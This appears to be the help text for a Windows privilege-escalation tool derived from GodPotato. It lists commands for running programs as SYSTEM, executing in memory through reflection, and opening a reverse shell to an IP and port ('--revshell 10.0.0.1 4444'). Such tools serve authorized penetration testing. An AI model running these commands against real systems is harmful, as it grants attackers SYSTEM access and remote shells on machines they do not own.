ABOUT
    Enhanced GodPotato derivative for privilege escalation from service account to
    SYSTEM. Supports disk execution, .NET reflection, PowerShell commands, and
    built in reverse shell.

USAGE:
    net-sigma-potato --- <command>
    net-sigma-potato --- --revshell <ip> <port>
    net-sigma-potato --- --help

EXAMPLES:
    net-sigma-potato --- whoami
    net-sigma-potato --- cmd.exe /c whoami
    net-sigma-potato --- --revshell 10.0.0.1 4444

NOTES:
    Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
    Supports in memory execution via [SigmaPotato]::Main('<command>') reflection.
